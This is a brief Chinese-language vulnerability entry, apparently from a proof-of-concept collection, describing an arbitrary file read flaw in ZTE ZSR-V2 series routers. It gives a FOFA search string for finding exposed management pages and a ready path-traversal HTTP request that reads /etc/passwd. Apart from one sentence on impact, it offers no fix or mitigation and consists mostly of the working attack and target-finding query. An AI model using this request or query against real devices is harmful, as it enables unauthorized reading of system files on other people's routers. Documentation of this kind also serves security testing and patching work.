# 中兴ZTE-ZSR-V2系列多业务路由器存在任意文件读取漏洞

中兴ZTE-ZSR-V2系列多业务路由器存在任意文件读取漏洞，任意文件下载漏洞可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。

## fofa

```javascript
title="ZSRV2路由器Web管理系统"
```

## poc

```
GET /css//../../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
```

